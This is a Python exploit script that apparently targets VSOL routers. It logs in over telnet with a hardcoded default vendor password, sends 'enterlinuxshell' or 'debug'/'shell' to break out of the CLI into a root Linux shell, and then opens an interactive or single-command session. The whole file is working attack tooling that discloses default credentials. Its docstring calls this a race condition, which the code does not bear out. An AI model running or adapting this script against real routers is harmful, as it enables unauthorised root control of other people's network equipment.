#!/usr/bin/env python3
"""
telnet_shell.py - Get root shell on VSOL router via telnet race condition
Exploits the telnet CLI -> Linux shell escape
"""

import socket
import time
import sys
import argparse

ROUTER_IP = "192.168.1.1"
ROUTER_PORT = 23
DEFAULT_USER = "admin"
DEFAULT_PASS = "stdONU101"

def telnet_login(host, port, user, passwd, timeout=10):
    """Login to router and get root shell"""
    
    print(f"[*] Connecting to {host}:{port}...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    
    # Wait for login prompt
    time.sleep(1)
    data = sock.recv(4096).decode('utf-8', errors='ignore')
    print(f"[<] {data[:100]}...")
    
    if "login:" in data.lower():
        print(f"[>] Sending username: {user}")
        sock.send((user + "\n").encode())
        time.sleep(0.5)
    
    data = sock.recv(4096).decode('utf-8', errors='ignore')
    if "password:" in data.lower():
        print(f"[>] Sending password: {'*' * len(passwd)}")
        sock.send((passwd + "\n").encode())
        time.sleep(0.5)
    
    data = sock.recv(4096).decode('utf-8', errors='ignore')
    print(f"[<] {data[:200]}")
    
    if ">" in data or "login" in data.lower():
        print("[*] Got CLI prompt, escaping to shell...")
        
        # The magic command that drops to Linux shell
        sock.send(b"enterlinuxshell\n")
        time.sleep(0.5)
        
        data = sock.recv(4096).decode('utf-8', errors='ignore')
        print(f"[<] {data}")
        
        if "#" in data:
            print("[+] ROOT SHELL OBTAINED!")
            return sock
        else:
            print("[!] Shell escape failed, trying alternative...")
            sock.send(b"debug\n")
            time.sleep(0.5)
            sock.send(b"shell\n")
            time.sleep(0.5)
            data = sock.recv(4096).decode('utf-8', errors='ignore')
            if "#" in data:
                print("[+] ROOT SHELL OBTAINED (via debug)!")
                return sock
    
    print("[!] Failed to get shell")
    sock.close()
    return None

def interactive_shell(sock):
    """Interactive shell session"""
    import select
    import sys
    import threading
    
    print("\n=== Interactive Shell ===")
    print("Type 'exit' to quit\n")
    
    running = True
    
    def receiver():
        while running:
            try:
                data = sock.recv(4096)
                if data:
                    sys.stdout.write(data.decode('utf-8', errors='ignore'))
                    sys.stdout.flush()
            except:
                break
    
    thread = threading.Thread(target=receiver)
    thread.daemon = True
    thread.start()
    
    try:
        while running:
            cmd = input()
            if cmd.strip() == "exit":
                break
            sock.send((cmd + "\n").encode())
    except KeyboardInterrupt:
        pass
    
    running = False
    sock.close()
    print("\n[*] Session closed")

def main():
    parser = argparse.ArgumentParser(description="VSOL Router Telnet Shell")
    parser.add_argument("-r", "--router", default=ROUTER_IP, help=f"Router IP (default: {ROUTER_IP})")
    parser.add_argument("-p", "--port", type=int, default=ROUTER_PORT, help=f"Telnet port (default: {ROUTER_PORT})")
    parser.add_argument("-u", "--user", default=DEFAULT_USER, help=f"Username (default: {DEFAULT_USER})")
    parser.add_argument("-P", "--password", default=DEFAULT_PASS, help=f"Password (default: {DEFAULT_PASS})")
    parser.add_argument("-c", "--command", help="Run single command and exit")
    
    args = parser.parse_args()
    
    sock = telnet_login(args.router, args.port, args.user, args.password)
    
    if sock:
        if args.command:
            sock.send((args.command + "\n").encode())
            time.sleep(1)
            data = sock.recv(8192).decode('utf-8', errors='ignore')
            print(data)
            sock.close()
        else:
            interactive_shell(sock)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
